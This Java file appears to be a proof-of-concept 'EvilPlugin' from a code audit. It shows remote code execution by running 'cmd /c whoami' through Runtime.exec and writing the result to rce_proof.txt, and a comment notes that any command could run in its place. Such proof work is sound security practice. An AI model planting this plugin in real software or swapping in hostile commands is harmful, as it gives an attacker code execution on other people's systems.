import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Path;

public class EvilPlugin {
    public static void run() {
        try {
            // 执行 whoami 并捕获回显（真实场景此处可为任意命令）
            Process p = Runtime.getRuntime().exec(new String[]{"cmd", "/c", "whoami"});
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream(), Charset.forName("GBK")));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) {
                sb.append(line);
            }
            String whoami = sb.toString().trim();
            System.out.println("[EvilPlugin] whoami = " + whoami);
            Files.writeString(Path.of("D:\\武器库\\AI-skill\\zcode工作区\\代码审计\\audit324\\rce_proof.txt"),
                    "whoami=" + whoami + "  (executed at " + java.time.LocalDateTime.now() + ")");
        } catch (Exception e) {
            System.out.println("[EvilPlugin] " + e);
        }
    }
}
